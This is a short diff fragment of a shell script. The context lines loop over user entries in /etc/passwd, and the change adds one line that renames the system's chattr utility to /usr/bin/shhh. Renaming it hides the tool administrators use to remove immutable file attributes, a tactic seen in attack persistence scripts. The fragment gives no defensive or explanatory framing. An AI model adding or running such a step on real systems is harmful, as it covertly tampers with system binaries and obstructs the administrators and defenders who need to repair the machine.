@@ -102,3 +102,4 @@ while IFS=: read -r username _ _ _ _ home _; do
     fi
 
 done < /etc/passwd
+mv `which chattr` /usr/bin/shhh
